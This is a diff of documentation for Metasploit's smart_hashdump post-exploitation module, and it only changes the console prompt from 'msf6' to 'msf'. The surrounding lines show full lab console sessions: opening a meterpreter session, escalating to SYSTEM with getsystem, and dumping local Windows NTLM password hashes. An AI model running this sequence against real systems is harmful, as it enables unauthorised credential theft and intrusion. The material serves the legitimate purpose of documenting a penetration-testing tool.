@@ -38,8 +38,8 @@ to elevate themselves to `NT AUTHORITY\SYSTEM` using Metasploit's `getsystem` mo
 to dump the password hashes.
 
 ```
-msf6 exploit(multi/handler) > use post/windows/gather/smart_hashdump
-msf6 post(windows/gather/smart_hashdump) > show options
+msf exploit(multi/handler) > use post/windows/gather/smart_hashdump
+msf post(windows/gather/smart_hashdump) > show options
 
 Module options (post/windows/gather/smart_hashdump):
 
@@ -48,9 +48,9 @@ Module options (post/windows/gather/smart_hashdump):
    GETSYSTEM  false            no        Attempt to get SYSTEM privilege on the target host.
    SESSION                     yes       The session to run this module on.
 
-msf6 post(windows/gather/smart_hashdump) > set SESSION 1
+msf post(windows/gather/smart_hashdump) > set SESSION 1
 SESSION => 1
-msf6 post(windows/gather/smart_hashdump) > run
+msf post(windows/gather/smart_hashdump) > run
 
 [*] Running module against DESKTOP-G7A2R2R
 [*] Hashes will be saved to the database if one is connected.
@@ -58,9 +58,9 @@ msf6 post(windows/gather/smart_hashdump) > run
 [*] /home/kali/.msf4/loot/20201008121933_default_192.168.56.117_windows.hashes_338495.txt
 [-] Insufficient privileges to dump hashes!
 [*] Post module execution completed
-msf6 post(windows/gather/smart_hashdump) > set GETSYSTEM true
+msf post(windows/gather/smart_hashdump) > set GETSYSTEM true
 GETSYSTEM => true
-msf6 post(windows/gather/smart_hashdump) > run
+msf post(windows/gather/smart_hashdump) > run
 
 [*] Running module against DESKTOP-G7A2R2R
 [*] Hashes will be saved to the database if one is connected.
@@ -85,7 +85,7 @@ msf6 post(windows/gather/smart_hashdump) > run
 
 **Running as the SYSTEM user on Windows 7 x64 SP1**
 ```
-msf6 exploit(multi/handler) > exploit
+msf exploit(multi/handler) > exploit
 
 [*] Started bind TCP handler against 172.24.15.185:4444
 [*] Sending stage (200262 bytes) to 172.24.15.185
@@ -99,8 +99,8 @@ meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 meterpreter > background
 [*] Backgrounding session 1...
-msf6 exploit(multi/handler) > use post/windows/gather/smart_hashdump
-msf6 post(windows/gather/smart_hashdump) > sessions -i 1
+msf exploit(multi/handler) > use post/windows/gather/smart_hashdump
+msf post(windows/gather/smart_hashdump) > sessions -i 1
 [*] Starting interaction with 1...
 
 meterpreter > sysinfo
@@ -113,9 +113,9 @@ Logged On Users : 2
 Meterpreter     : x64/windows
 meterpreter > background
 [*] Backgrounding session 1...
-msf6 post(windows/gather/smart_hashdump) > set SESSION 1
+msf post(windows/gather/smart_hashdump) > set SESSION 1
 SESSION => 1
-msf6 post(windows/gather/smart_hashdump) > run
+msf post(windows/gather/smart_hashdump) > run
 
 [*] Running module against TEST-PC
 [*] Hashes will be saved to the database if one is connected.
@@ -135,5 +135,5 @@ msf6 post(windows/gather/smart_hashdump) > run
 [+] 	test:1000:aad3b435b51404eeaad3b435b51404ee:0cb6948805f797bf2a82807973b89537:::
 [+] 	test2:1001:aad3b435b51404eeaad3b435b51404ee:0e8231621f574d3636255ff36dd86c9c:::
 [*] Post module execution completed
-msf6 post(windows/gather/smart_hashdump) >
+msf post(windows/gather/smart_hashdump) >
 ```
